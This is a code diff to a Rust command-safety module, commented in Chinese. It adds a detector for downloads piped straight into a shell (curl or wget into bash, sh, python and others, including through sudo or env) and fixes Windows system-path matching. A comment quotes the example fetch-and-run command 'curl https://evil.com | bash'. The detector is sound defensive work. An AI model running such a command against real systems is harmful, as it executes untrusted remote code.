@@ -111,14 +111,46 @@ pub fn is_dangerous_pattern(command: &str) -> bool {
     DANGEROUS_BASH_PATTERNS
         .iter()
         .any(|pattern| cmd_lower.contains(&pattern.to_lowercase()))
+        || pipes_download_into_shell(&cmd_lower)
+}
+
+/// `curl … | bash` / `wget … | sudo sh` 这类"下载完直接执行"。
+///
+/// 字面量模式表里只有 `"curl | bash"`，URL 一夹在中间就匹配不上
+/// （`curl https://evil.com | bash` 是最常见的写法），所以这里按管道两侧判断。
+fn pipes_download_into_shell(cmd_lower: &str) -> bool {
+    if !(cmd_lower.contains("curl") || cmd_lower.contains("wget")) {
+        return false;
+    }
+    // 取最后一个管道之后的部分
+    let Some((_, rhs)) = cmd_lower.rsplit_once('|') else {
+        return false;
+    };
+    // 允许 `| sudo bash`、`| env bash` 这类包装前缀
+    let mut words = rhs.split_whitespace();
+    let Some(mut first) = words.next() else {
+        return false;
+    };
+    if first == "sudo" || first == "env" {
+        match words.next() {
+            Some(next) => first = next,
+            None => return false,
+        }
+    }
+    matches!(
+        first,
+        "sh" | "bash" | "zsh" | "dash" | "fish" | "ksh" | "python" | "python3"
+    )
 }
 
 /// 检查路径是否为系统路径
 pub fn is_system_path(path: &str) -> bool {
-    let path_normalized = path.replace('\\', "/");
+    // SYSTEM_PATHS 里 Windows 条目是 `C:\Windows\` 形式，这里必须两边一起归一化，
+    // 否则路径被换成 `/` 之后永远匹配不上（历史 bug）。
+    let normalized = path.replace('\\', "/").to_lowercase();
     SYSTEM_PATHS
         .iter()
-        .any(|sys_path| path_normalized.starts_with(sys_path))
+        .any(|sys_path| normalized.starts_with(&sys_path.replace('\\', "/").to_lowercase()))
 }
 
 /// 检查权限规则是否危险
